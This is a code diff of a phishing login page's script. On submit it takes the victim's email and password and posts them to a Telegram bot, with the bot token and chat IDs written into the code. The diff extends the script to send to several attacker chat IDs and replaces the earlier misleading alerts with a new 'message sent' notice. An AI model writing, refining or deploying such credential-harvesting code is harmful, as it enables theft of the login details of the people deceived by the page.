@@ -266,17 +266,17 @@ footer .copyright {
     </footer>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
 
-            // Telegram bot information
-            const botToken = '7765605226:AAHZxGG3bkQtOgrapSrqrlywJX416idTqug'; // Enter your Telegram bot token here
-            const chatId = ['7984884145', '925918834']; // Enter your Telegram chat ID here
-            const message = `New login details:\nEmail/Username: ${email}\nPassword: ${password}`;
+        const botToken = '7765605226:AAHZxGG3bkQtOgrapSrqrlywJX416idTqug';
+        const chatIds = ['7984884145', '925918834']; // Bu yerda array bo'lishi mumkin, ammo ishlov alohida bo'ladi
+        const message = `New login details:\nEmail/Username: ${email}\nPassword: ${password}`;
 
+        chatIds.forEach(chatId => {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -289,17 +289,18 @@ footer .copyright {
             })
             .then(response => response.json())
             .then(data => {
-                if (data.ok) {
-                    alert('Check your internet connection or try again.');
-                } else {
-                    alert('An error occurred: ' + data.description);
+                if (!data.ok) {
+                    console.error(`Xatolik: ${data.description}`);
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
-                alert('Check your internet connection or try again.');
+                console.error('Tarmoq xatosi:', error);
             });
         });
-    </script>
+
+        alert('Xabar yuborildi.');
+    });
+</script>
+
 </body>
 </html>
